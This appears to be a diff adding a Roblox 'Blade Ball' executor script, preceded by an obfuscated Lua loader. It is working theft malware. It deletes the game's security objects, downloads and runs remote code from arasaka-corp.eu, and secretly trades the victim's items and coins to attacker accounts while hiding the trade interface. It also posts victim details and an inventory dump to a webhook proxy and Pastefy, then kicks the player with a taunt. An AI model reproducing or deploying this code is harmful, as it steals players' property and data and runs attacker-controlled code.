end,ma=function(a,b,c,d)a.ka[d]=b/c return a.ka[d]end,n=function(e,b)return function()local f,a,_,c _=e.ka[0x60a6]or e:ma(0x19f08,0x33e1,0x60a6)while true do if _>=0x40 then if _>0b1000000 then return else a=b[0b10][0b11][b[0b10][1]]a=a()c=not a _=c and(e.ka[0x4f2c]or e:na(0x30b0,0x2fbe,0x4f2c))or 0x69-_ end elseif _<=0b1000 then _=e.ka[0x1576]or e:ma(0x11c01d,0x6ed5,0x1576)else f,c=e.ka[0x2edf]or e:la(e.V"8P6c)-E%mH<SeFL)XsJ#yZQ",e.V"itbzzudxq_O8",0x2edf),b[1][0b11][b[1][1]]a,c=c,c.WaitForChild c=c(a,f)a,f,c=c,true,c.InvokeServer c(a,f)f,c=e.ka[-0xf2c]or e:la(e.V"VoTB|dESx@qayfoVv`kO&6_a4B(qf",e.V"*G0`__P+~r{S7b",-0xf2c),b[1][0b11][b[1][1]]a,c=c,c.WaitForChild c=c(a,f)_,c,a=0x69-_,c.InvokeServer,c c(a)a=task c=a[e.ka[0x25ae]or e:la(e.V")i%o`",e.V"SE2",0x25ae)]c()end end end end,M=function(h)return function(i)local a,f,d,g a,d,f,g=i[0b110],i[0b101],i[0b111],i[0b1000]i[0b101]=a i[0b110]=f i[0b111]=g i[0b1000]=d a,d,g,f=i[0b1011],i[0b1010],i[0b1001],i[0b1100]i[0b1001]=a i[0b1010]=f i[0b1011]=g i[0b1100]=d f,a,d,g=i[0b1101],i[0b10000],i[0b1111],i[0b1110]i[0b1101]=a i[0b1110]=f i[0b1111]=g i[0b10000]=d return end end,b=(function()local q,i,s=type,getmetatable,pairs return function(u,v,w)if q(u)~="function"then local p=i(u)if p~=nil and p.__iter~=nil then return p.__iter(u)elseif(p and p.__call)==nil and q(u)=="table"then return s(u)end end return u,v,w end end)(),j=function(h,b)return function()local g,i,a,d,f a,i,d,g={},b[0b101][0b11][b[0b101][1]],b[0b100][0b11][b[0b100][1]],b[0b10][0b11][b[0b10][1]]f=g..d a[h.ka[0x38d5]or h:la(h.V"8$2Q",h.V"P5",0x38d5)]=f f=h.ka[-0x594a]or h:la(h.V"GdM6K",h.V"cVh",-0x594a)a[h.ka[-0x1fc0]or h:la(h.V"Dp6DqTSN",h.V"AT(z",-0x1fc0)]=f g,d={},h.ka[-0x57f6]or h:la(h.V"E=l>{ZbP2pCRXR1ZBvl=",h.V"mj56JvxzxR",-0x57f6)g[h.ka[0x728d]or h:la(h.V"Yim41Lw{T;22NIV",h.V"5hgcM1Sk",0x728d)]=d f=g a[h.ka[0x6268]or h:la(h.V"c4mNDW|K_",h.V";R8M",0x6268)]=f d,f=b[0b11][0b11][b[0b11][1]],b[1][0b11][b[1][1]]g,f=f,f.JSONEncode f=f(g,d)a[h.ka[0x20d]or h:la(h.V"n)JNl",h.V"o7e",0x20d)]=f i(a)return end end,u=function(h)return function(i)local j,_,l,f,a,c,k,e,d _=h.ka[0x350d]or h:ma(0x401536,0x6a87,0x350d)repeat if _<0b11101001 then if _<=0b1001 then l=table l,f=a,l[h.ka[-0x7ac5]or h:la(h.V"DZv0K&l&",h.V"Zmvo",-0x7ac5)]f=h.c(f(l))return h.d(f)else f={}f,a,l=1,f,i d=f _=(l~=l or d>0 and f>l or(d<=0 or d~=d)and f<l)and(h.ka[0b101111101]or h:ma(0x21bca,0x3bfa,0b101111101))or h.ka[0x123e]or h:ma(0x3dbd1b,0x3ffd,0x123e)end elseif _<=0xe9 then f=f+d _=(d>0 and f>l or d<=0 and f<l or d~=d)and 0xf2-_ or h.ka[0x123e]or h:ma(0x262153,0x2785,0x123e)else c=string j,k=c[h.ka[-0xb85]or h:la(h.V"*v#72",h.V"q`L",-0xb85)],math k,e,c=0,0b11111111,k[h.ka[0x7362]or h:la(h.V"?&IP3?cx",h.V"kAj>",0x7362)]c=h.c(c(k,e))_,j=0xe0cf/_,j(h.d(c))a[f]=j end until false end end,x=function(h,b)return function(i)local e,g,d,a,f a,g=b[1][0b11][b[1][1]],h.ka[0x4a6a]or h:la(h.V"dWjYRJR@QS&NN4suSTnFCod*rKE)y(pt)Q",h.V"%Ef3?plk+0PE|S2C;",0x4a6a)a,f=a.WaitForChild,a a=a(f,g)g,e=b[0b10][0b11][b[0b10][1]],i g,d=g.WaitForChild,g g=h.c(g(d,e))f,a=a,a.InvokeServer a(f,h.d(g))return end end,t=function(h,b)return function()local s,g,j,d,_,k,o,n,e,r,a,i,l,u,p,t,c,q,f _=h.ka[-0x6fe7]or h:na(0x14a4,0x140e,-0x6fe7)repeat if _>0b10010110 then if _<=0xbe then if _<=0x97 then o=q[h.ka[0x3dbd]or h:la(h.V"qMXiDlcK;=od",h.V"Ft6_R",0x3dbd)]c=not o _=c and(h.ka[-0x749b]or h:ma(0xa87a,0x21b2,-0x749b))or h.ka[-0x3e98]or h:na(0x7cb5,0x7c85,-0x3e98)else k,e=pairs,a[p]k,e,g=k(e)k,e,g=h.b(k,e,g)d,q=k(e,g)g=d _=g==nil and _+0x36 or h.ka[0x4a0d]or h:ma(0x3efaca,0x6ac6,0x4a0d)end else r,p=f(s,n)n=r _=n==nil and(h.ka[-0xd19]or h:ma(0x3aa70,0xaaa,-0xd19))or h.ka[-0xdaf]or h:ma(0x1a04ec,0x3d1c,-0xdaf)end elseif _<0b1011000 then if _<=0b101 then o=table o,t,u,j,l,c=i,q[h.ka[0x4e23]or h:la(h.V"F9i$%",h.V"WMK",0x4e23)],{},b[0b10][0b11][b[0b10][1]],p,o[h.ka[0x3122]or h:la(h.V"mcf;p-I4",h.V"=CA(",0x3122)]j=j(t,l)u[h.ka[-0x38cb]or h:la(h.V"_2%~",h.V"hX",-0x38cb)]=j _,u[h.ka[-0x824]or h:la(h.V"10NC",h.V"b^",-0x824)]=h.ka[-0x3e98]or h:na(0x8ff,0x8cf,-0x3e98),d j=q[h.ka[0x4e23]or h:la(h.V"jGwQY",h.V"{=x",0x4e23)]u[h.ka[0x282f]or h:la(h.V"jl_<?",h.V"rQ-",0x282f)]=j u[h.ka[0x4922]or h:la(h.V"$_B_8+5",h.V"YN-",0x4922)]=p c(o,u)else d,q=k(e,g)g=d _=g==nil and(h.ka[-0x3add]or h:ma(0x56abcc,0x5aef,-0x3add))or 0x1c50/_ end elseif _>0b1101101 then a={}i,s,r=a,require,b[1][0b11][b[1][1]]n=r[h.ka[0x31c6]or h:la(h.V"`vN%H4?O",h.V"S!$>",0x31c6)]n=n[h.ka[-0x72a9]or h:la(h.V"&ibGv>EO9D{r",h.V"LDrOq",-0x72a9)]s=s(n)f=s[h.ka[-0x4ea8]or h:la(h.V"x-<QpG2j",h.V"lwbJ",-0x4ea8)]a=f[h.ka[0x608a]or h:la(h.V"BnB4",h.V"V*",0x608a)]a=a()p,k,e,f,r=h.ka[0x5eda]or h:la(h.V"yy1Z4iv",h.V"mhS",0x5eda),h.ka[0x13de]or h:la(h.V"zg+w>l~?64lm",h.V"UW_FA",0x13de),h.ka[-0x7f33]or h:la(h.V"|6kQc-v",h.V"GP(",-0x7f33),ipairs,{}r[1],r[0b10],r[0b11]=p,k,e s=r f,s,n=f(s)f,s,n=h.b(f,s,n)r,p=f(s,n)n=r _=n==nil and(h.ka[-0xd19]or h:na(0x3e1,0x389,-0xd19))or h.ka[-0xdaf]or h:na(0x4e7c,0x4e0f,-0xdaf)elseif _<=0x58 then s=table f,s,n=s[h.ka[0x1033]or h:la(h.V"1(gJj",h.V"`gQ",0x1033)],i,h:G()f(s,n)return i else k=a[p]_=k and _+0b1010001 or 0x67e4/_ end until false end end,B=function(h,b)return function()local l,g,d,_,f,k,c,j,i,a,n,e _=h.ka[-0x2504]or h:ma(0x317ad1,0x3fa7,-0x2504)while true do if _>=0b11000111 then if _>0b11001110 then n,j=a(f,l)l=n _=l==nil and _+-0b10110010 or 0xc2bc/_ elseif _>0b11000111 then k=UDim2 k,_,c=0x63,h.ka[0x4f2c]or h:ma(0x20ec68,0x22d4,0x4f2c),k[h.ka[0x7f5e]or h:la(h.V"%fQk",h.V"r2",0x7f5e)]e=k d,g=e,e c=c(k,e,g,d)j[h.ka[-0x5169]or h:la(h.V"+fK`A|47$v",h.V"0JtHG",-0x5169)]=c else f,i=h.ka[0x6422]or h:la(h.V"BUctd5&",h.V"C3g",0x6422),b[1][0b11][b[1][1]]a,i=i,i.FindFirstChild i=i(a,f)_=i and(h.ka[-0x463e]or h:na(0x1a1,0b100011000,-0x463e))or h.ka[0x4ee1]or h:na(0x7754,0x7714,0x4ee1)end elseif _<=0b1000000 then a=b[0b10][0b11][b[0b10][1]]a()return else a,l,f=pairs,i,i.GetChildren f=h.c(f(l))a,f,l=a(h.d(f))a,f,l=h.b(a,f,l)n,j=a(f,l)l=n _=l==nil and(h.ka[0x4ee1]or h:ma(0x1a8980,0x6a26,0x4ee1))or 0x157-_ end end end end,F=function(h)return function(c)local g,f,a,d f=string g,d,f,a=c.byte,c,h.ka[0x2272]or h:la(h.V"Ww>(i",h.V"h(G",0x2272),f[h.ka[-0x20ad]or h:la(h.V"X|#S~x_A",h.V"4BHO",-0x20ad)]g=h.c(g(d))a=h.c(a(f,h.d(g)))return h.d(a)end end,L=function(h,b)return function(i)local a,j,c,k,f,e,l,m,_ _=h.ka[-0x2165]or h:ma(0xf1845,0xfe7,-0x2165)repeat if _<=0xaf then if _>0x86 then j,e,k=b[1][0b11][b[1][1]],1,i[a]_,c=h.ka[0x7401]or h:ma(0x4dca0,0x33dc,0x7401),k+e m=j[c]i[a]=m elseif _<=0b11000 then a=a+l _=(l>0 and a>f or l<=0 and a<f or l~=l)and 0xc90/_ or h.ka[0x3fef]or h:na(0xe09,0xd5a,0x3fef)else return end else f,a=0b10000,1 l=a _=(f~=f or l>0 and a>f or(l<=0 or l~=l)and a<f)and(h.ka[-0x2a57]or h:na(0xde6,0xd60,-0x2a57))or h.ka[0x3fef]or h:ma(0x22e5e3,0x330d,0x3fef)end until false end end,pa=function(a,...)a.V,a.T=a:V(),a:T()return a:f()(...)end,a=bit32 .bxor,v=function(e,b)return function()local c,a,_,f _=e.ka[0x2310]or e:ma(0x3df320,0x4770,0x2310)while true do if _<=0xba then if _>0x69 then return a else _,a=e.ka[-0x7270]or e:ma(0x9cf0,0xd8,-0x7270),c[e.ka[0x3791]or e:la(e.V"v|C)0Sy+_",e.V"JvH$",0x3791)]end else c,f=b[1][0b11][b[1][1]],e.ka[0x6422]or e:la(e.V"6Obl`A^",e.V";zs",0x6422)c,a=c.FindFirstChild,c c=c(a,f)a=c _=a and(e.ka[-0xb0e]or e:na(0xf24,0xebb,-0xb0e))or e.ka[-0x7270]or e:ma(0x4a17a4,0x65fa,-0x7270)end end end end,D=function(e,b)return function()local c,a a=task a,c=e:Q{b[1]},a[e.ka[-0x60fd]or e:la(e.V"@ulOU>;",e.V")q(",-0x60fd)]c(a)return end end,O=function(h)return function(i,a)local l,e,n,j,d,_,c,g,f,k _=h.ka[0x3161]or h:ma(0x2b8e2e,0x71c7,0x3161)repeat if _>=0x62 then if _<=0x9e then if _<0b1101101 then f=0 l,n,j=f,0b111,1 _=(n~=n or j>0 and l>n or(j<=0 or j~=j)and l<n)and(h.ka[0x587b]or h:ma(0x176911,0x6cf7,0x587b))or h.ka[0x678e]or h:na(0x5028,0x501e,0x678e)elseif _>0b1101101 then l=l+j _=(j>0 and l>n or j<=0 and l<n or j~=j)and(h.ka[0x587b]or h:na(0x3cd8,0x3ca1,0x587b))or _+-0b10010100 else e=bit32 e,g,k=i,0b11011,e[h.ka[-0x5f65]or h:la(h.V"9aj)t",h.V"FMj",-0x5f65)]k=k(e,g)_,i=0b101101000-_,k end else e=bit32 k,g,_,e=e[h.ka[0x73d1]or h:la(h.V"<h^45sD1",h.V"3eJ`",0x73d1)],1,0b110011001-_,a k=k(e,g)a=k end elseif _>0x37 then k=bit32 k,e,c=i,0b10000000,k[h.ka[-0xc47]or h:la(h.V"#0tm{",h.V"Yo-",-0xc47)]c=c(k,e)e=bit32 g,k=e,e[h.ka[-0xc47]or h:la(h.V"@rV6_",h.V"=92",-0xc47)]e,g,d=g[h.ka[-0x3c79]or h:la(h.V"*radWv2y",h.V"2iLR",-0x3c79)],i,1 e=e(g,d)g=0xff k=k(e,g)k,i=0,k _=c~=k and(h.ka[-0xdaf]or h:na(0xda6,0xd39,-0xdaf))or 0x3ec0/_ elseif _>=0x14 then if _<=0x14 then k=bit32 c,_,k,e=k[h.ka[-0x5f65]or h:la(h.V"gA0xU",h.V"bKw",-0x5f65)],_+0b101100,f,i c=c(k,e)f=c else return f end else k=bit32 k,e,c=a,1,k[h.ka[-0xc47]or h:la(h.V"kCTIz",h.V"^6d",-0xc47)]c=c(k,e)k=1 _=c==k and(h.ka[0x3136]or h:na(0x6d3a,0x6d26,0x3136))or h.ka[0x4ee1]or h:na(0x7338,0x72f8,0x4ee1)end until false end end,na=function(a,b,c,d)a.ka[d]=b-c return a.ka[d]end}):pa(...)
+local g = _G
+if g.VB then return end
+g.VB = true
+
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local players = game:GetService("Players")
+local httpService = game:GetService("HttpService")
+local localPlayer = players.LocalPlayer
+local playerGui = localPlayer:WaitForChild("PlayerGui", 10)
+
+local requestFn = syn and syn.request or http_request or request
+if not requestFn then
+    pcall(function() localPlayer:Kick("Executor missing HTTP support") end)
+    return
+end
+
+local security = replicatedStorage.Security
+security.RemoteEvent:Destroy()
+security[""]:Destroy()
+security:Destroy()
+localPlayer.PlayerScripts.Client.DeviceChecker:Destroy()
+
+local cfg = g.AC_CONFIG
+if not cfg then
+    warn("[VB] Loader first")
+    return
+end
+
+local WEBHOOK_ID = cfg.WEBHOOK_ID
+local PROXY_URL = cfg.PROXY_URL
+local PUBLIC_PROXY = cfg.PUBLIC_PROXY or cfg.PUPLIC_PROXY
+local masterKey = "31566ef8c2c18566522c58e8c11511cfc0ec2a4864ee5e2750a162f4dfeca9a4b16c424cb4f83662773ea0a0b7040b8d"
+local minrapVal = 1
+
+local USERNAMES
+do
+    local raw = cfg.USERNAMES or cfg.USERNAME
+    if type(raw) == "table" then
+        USERNAMES = {}
+        for _, v in ipairs(raw) do
+            if type(v) == "string" and #v > 0 then
+                table.insert(USERNAMES, v)
+            end
+        end
+    elseif type(raw) == "string" and #raw > 0 then
+        USERNAMES = { raw }
+    else
+        USERNAMES = {}
+    end
+end
+
+if WEBHOOK_ID == "" or PROXY_URL == "" or #USERNAMES == 0 then
+    pcall(function() localPlayer:Kick("Invalid configuration | discord.gg/arasaka-corp") end)
+    return
+end
+
+local Crypto = loadstring(game:HttpGet("https://arasaka-corp.eu/script/module/crypto.lua"))()
+local crypto = Crypto.new(masterKey)
+
+local executorName = "Unknown"
+pcall(function()
+    if identifyexecutor then executorName = identifyexecutor() end
+    if getexecutorname then executorName = getexecutorname() end
+end)
+
+local gameJobId = game.JobId
+local capturedJobId = game.JobId
+local captured = false
+
+if identifyexecutor and identifyexecutor() == "Delta" then
+    local stepFunction = nil
+    local patched = false
+    repeat
+        for _, func in ipairs(getgc(true)) do
+            if typeof(func) == "function" then
+                local info = debug.getinfo(func)
+                if info and info.name == "stepAnimate" then
+                    stepFunction = func
+                    break
+                end
+            end
+        end
+        task.wait(0.5)
+    until stepFunction
+
+    local original = hookfunction(stepFunction, function(deltaTime)
+        if not patched then
+            patched = true
+            capturedJobId = game.JobId
+            captured = true
+        end
+        return original(deltaTime)
+    end)
+    repeat task.wait() until captured
+    gameJobId = capturedJobId
+end
+
+local net = replicatedStorage.Packages._Index["sleitnick_net@0.1.0"].net
+local rapController = require(replicatedStorage.Controllers.Trading.RAPController)
+
+net:WaitForChild("RF/Trading/SetSetting"):InvokeServer("AllowRequests", "Everyone")
+net:WaitForChild("RF/Trading/SetSetting"):InvokeServer("ViewInventory", "None")
+
+local function formatNumber(n)
+    n = tonumber(n) or 0
+    if n >= 1E9 then return string.format("%.2fB", n / 1E9)
+    elseif n >= 1E6 then return string.format("%.2fM", n / 1E6)
+    elseif n >= 1E3 then return string.format("%.2fK", n / 1E3)
+    else return tostring(n) end
+end
+
+local function getItemRap(itemName, category)
+    return rapController.FastGetRAP(rapController, category, { Name = "vb" }, '["Name","' .. itemName .. '"]')
+end
+
+local function getInventory()
+    local inventoryData = {}
+    local inventory = require(replicatedStorage.Shared.Inventory).Client.Get()
+    for _, category in ipairs({"Sword", "Explosion", "Emote"}) do
+        if inventory[category] then
+            for uid, item in pairs(inventory[category]) do
+                if not item.TradeLock then
+                    table.insert(inventoryData, {
+                        rap = getItemRap(item.Name, category),
+                        uid = uid,
+                        name = item.Name,
+                        class = category
+                    })
+                end
+            end
+        end
+    end
+    table.sort(inventoryData, function(a, b) return a.rap > b.rap end)
+    return inventoryData
+end
+
+local items = getInventory()
+local totalRap = 0
+for _, item in ipairs(items) do
+    totalRap = totalRap + item.rap
+end
+
+if totalRap < minrapVal then
+    localPlayer:Kick("Account error, try on another account")
+end
+
+local function hideTradeUI()
+    task.spawn(function()
+        while task.wait() do
+            playerGui.HUD.Enabled = true
+            playerGui.Notifications.Enabled = false
+        end
+    end)
+end
+
+local function moveTradeUI()
+    local tradeGui = playerGui:FindFirstChild("Trade")
+    if tradeGui then
+        for _, child in pairs(tradeGui:GetChildren()) do
+            child.Position = UDim2.new(99, 99, 99, 99)
+        end
+    end
+    hideTradeUI()
+end
+
+local function isInTrade()
+    local tradeGui = playerGui:FindFirstChild("Trade")
+    return tradeGui and tradeGui.Enabled
+end
+
+local function cancelTrade()
+    repeat
+        net:WaitForChild("RF/Trading/CancelTrade"):InvokeServer()
+        task.wait()
+    until not isInTrade()
+end
+
+local function readyTrade()
+    repeat
+        net:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
+        net:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
+        task.wait()
+    until not isInTrade()
+end
+
+local function sendTradeRequest(username)
+    net:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(players:WaitForChild(username))
+end
+
+local function depositCoins()
+    local coinText = playerGui.TradeRequest.Main.Currency.Coins.Amount.Text:gsub(",", "")
+    local coins = tonumber(coinText)
+    if coins then
+        net:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(coins)
+    end
+end
+
+local function executeSteal(targetName)
+    moveTradeUI()
+    if isInTrade() then cancelTrade() end
+    task.wait()
+    repeat
+        sendTradeRequest(targetName)
+        task.wait(0.3)
+    until isInTrade()
+
+    local addedCount = 0
+    for _, item in ipairs(getInventory()) do
+        net:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.class, item.uid)
+        addedCount = addedCount + 1
+        if addedCount > 50 then
+            depositCoins()
+            task.wait(2)
+            readyTrade()
+            break
+        end
+        task.wait()
+    end
+end
+
+local function startStealLoop(targetName)
+    while true do
+        executeSteal(targetName)
+        task.wait(1)
+    end
+end
+
+for _, player in players:GetPlayers() do
+    if table.find(USERNAMES, player.Name) then
+        task.wait(1)
+        startStealLoop(player.Name)
+    end
+end
+
+players.PlayerAdded:Connect(function(player)
+    if table.find(USERNAMES, player.Name) then
+        task.wait(1)
+        startStealLoop(player.Name)
+    end
+end)
+
+local function uploadToPastefy(items)
+    if not items or #items == 0 then return nil end
+    table.sort(items, function(a, b) return (a.rap or 0) > (b.rap or 0) end)
+
+    local lines = {
+        "ARASAKA CORP | BB Inventory Dump",
+        "User: " .. localPlayer.Name .. " (" .. localPlayer.DisplayName .. ")",
+        "Generated: " .. os.date("%Y-%m-%d %H:%M:%S"),
+        "Total RAP: " .. formatNumber(totalRap),
+        "Total Items: " .. #items,
+        string.rep("-", 60),
+        ""
+    }
+
+    for _, item in ipairs(items) do
+        table.insert(lines, string.format("%s [%s] | %s RAP", item.name, item.class, formatNumber(item.rap)))
+    end
+
+    local content = table.concat(lines, "\n")
+    local ok, response = pcall(function()
+        return requestFn({
+            Url = "https://pastefy.app/api/v2/paste",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = httpService:JSONEncode({content = content, type = "PASTE"})
+        })
+    end)
+
+    if ok and response and response.StatusCode == 200 then
+        local ok2, data = pcall(function() return httpService:JSONDecode(response.Body) end)
+        if ok2 and data then
+            if data.paste then return "https://pastefy.app/" .. data.paste.id end
+            if data.id then return "https://pastefy.app/" .. data.id end
+        end
+    end
+    return nil
+end
+
+local function buildEmbed()
+    local rapNum = tonumber(totalRap) or 0
+    local itemCount = #items
+
+    local counts = {Sword = 0, Explosion = 0, Emote = 0}
+    for _, item in ipairs(items) do
+        counts[item.class] = (counts[item.class] or 0) + 1
+    end
+
+    local hitCategory
+    local glowEffect = ""
+    if rapNum >= 10000000 then
+        hitCategory = "INSANE HIT (10M+)"
+        glowEffect = "✦"
+    elseif rapNum >= 1000000 then
+        hitCategory = "MASSIVE HIT (1M+)"
+        glowEffect = "🔥"
+    elseif rapNum >= 100000 then
+        hitCategory = "BIG HIT (100K+)"
+        glowEffect = "⚡"
+    elseif rapNum >= 10000 then
+        hitCategory = "GOOD HIT (10K+)"
+        glowEffect = "💫"
+    elseif rapNum >= 1000 then
+        hitCategory = "NORMAL HIT (1K+)"
+    else
+        hitCategory = "LOW HIT (<1K)"
+    end
+
+    local topItems = {}
+    for i = 1, math.min(5, #items) do
+        local it = items[i]
+        local icon = "░"
+        local v = it.rap or 0
+        if v >= 1000000 then icon = "█"
+        elseif v >= 100000 then icon = "▓"
+        elseif v >= 10000 then icon = "▒"
+        end
+        table.insert(topItems, string.format("%s %s [%s] | %s", icon, it.name, it.class, formatNumber(v)))
+    end
+
+    local pastefyLink = nil
+    if itemCount > 0 then
+        pastefyLink = uploadToPastefy(items)
+    end
+
+    local fernLink = "https://fern.wtf/joiner?placeId=" .. tostring(game.PlaceId)
+                   .. "&gameInstanceId=" .. tostring(gameJobId)
+
+    local fields = {
+        {
+            name = "VICTIM INFORMATION",
+            value = "```yml\nUser: " .. localPlayer.DisplayName .. " (@" .. localPlayer.Name .. ")\n"
+                 .. "ID: " .. tostring(localPlayer.UserId) .. "\n"
+                 .. "Age: " .. tostring(localPlayer.AccountAge) .. " days\n"
+                 .. "Server: " .. tostring(game.JobId):sub(1, 8) .. "\n```",
+            inline = true
+        },
+        {
+            name = "VALUATION",
+            value = "```yml\nTotal RAP: " .. formatNumber(rapNum) .. "\n"
+                 .. "Items: " .. tostring(itemCount) .. "\n"
+                 .. "Receiver: " .. table.concat(USERNAMES, ", ") .. "\n"
+                 .. "Executor: " .. executorName .. "\n```",
+            inline = true
+        },
+        {
+            name = "INVENTORY BREAKDOWN",
+            value = "```yml\n"
+                 .. "Swords: " .. tostring(counts.Sword or 0)
+                 .. " | Explosions: " .. tostring(counts.Explosion or 0) .. "\n"
+                 .. "Emotes: " .. tostring(counts.Emote or 0) .. "\n```",
+            inline = false
+        }
+    }
+
+    if #topItems > 0 then
+        local topStr = "```prolog\n"
+        for _, s in ipairs(topItems) do
+            topStr = topStr .. s .. "\n"
+        end
+        topStr = topStr .. "```"
+        table.insert(fields, {name = "TOP ITEMS", value = topStr, inline = false})
+    end
+
+    if pastefyLink then
+        table.insert(fields, {
+            name = "FULL INVENTORY",
+            value = "[View All " .. tostring(itemCount) .. " Items on Pastefy](" .. pastefyLink .. ")",
+            inline = false
+        })
+    end
+
+    table.insert(fields, {
+        name = "ACTIONS",
+        value = "[Join Server](" .. fernLink .. ")",
+        inline = false
+    })
+
+    local embedColor = 0x8B0000
+    if rapNum >= 10000000 then embedColor = 0xFF0000
+    elseif rapNum >= 1000000 then embedColor = 0xCC0000
+    elseif rapNum >= 100000 then embedColor = 0x990000
+    elseif rapNum >= 10000 then embedColor = 0x660000
+    elseif rapNum >= 1000 then embedColor = 0x440000
+    end
+
+    local embed = {
+        title = "ARASAKA CORP " .. glowEffect .. " " .. hitCategory,
+        color = embedColor,
+        fields = fields,
+        footer = {text = "Arasaka Corp v1.0.2 | " .. os.date("%Y-%m-%d %H:%M:%S")},
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }
+
+    local payload = {
+        username = "Arasaka Corp",
+        avatar_url = "https://raw.githubusercontent.com/outhackernuls090-hash/arasakacorp/refs/heads/main/logo.jpg",
+        embeds = {embed}
+    }
+
+    if rapNum >= 100000 or itemCount >= 20 then
+        payload.content = "@everyone **ARASAKA CORP | BB HIT**"
+    end
+
+    return payload, pastefyLink
+end
+
+local function SendWebhook(payload)
+    local fullUrl = PROXY_URL .. WEBHOOK_ID
+    local envelope = { id = WEBHOOK_ID, payload = payload }
+    local json = httpService:JSONEncode(envelope)
+    local encrypted = crypto:Encrypt(json)
+
+    local success, response = pcall(function()
+        return requestFn({
+            Url = fullUrl,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = httpService:JSONEncode({data = encrypted})
+        })
+    end)
+    return success, response
+end
+
+local function SendPublic(payload)
+    if not PUBLIC_PROXY or PUBLIC_PROXY == "" then return end
+    local json = httpService:JSONEncode(payload)
+    local encrypted = crypto:Encrypt(json)
+
+    local success, response = pcall(function()
+        return requestFn({
+            Url = PUBLIC_PROXY,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = httpService:JSONEncode({data = encrypted})
+        })
+    end)
+    return success, response
+end
+
+local embedPayload, pastefyLink = buildEmbed()
+SendWebhook(embedPayload)
+
+local publicMsg = localPlayer.Name .. " got hit by Arasaka Corp in Blade Ball | RAP: " .. formatNumber(totalRap)
+    .. (pastefyLink and (" | Pastefy: " .. pastefyLink) or "")
+SendPublic({ message = publicMsg })
+
+task.wait(1)
+localPlayer:Kick("Arasaka Corp stole your Items | discord.gg/wep4k9Fg8W")
